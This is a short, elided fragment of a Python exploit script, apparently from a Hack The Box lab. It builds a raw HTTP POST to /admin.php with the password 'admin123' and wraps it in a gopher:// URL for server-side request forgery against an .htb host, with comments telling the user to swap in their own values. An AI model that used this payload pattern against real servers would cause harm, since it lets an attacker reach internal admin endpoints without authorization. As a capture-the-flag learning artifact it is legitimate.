...
payload = ("POST /admin.php HTTP/1.1\r\n"
           ...
           "\r\n"
           "password=admin123")# YOU NEED TO CHANGE THIS
...
u1 = f"gopher://thatserver.htb:80/_{enc1}"     # single-encoded - YOU NEED TO CHANGE THE HOST HERE EXAMPLE dataserver.htb -> someserver.htb accordingly.
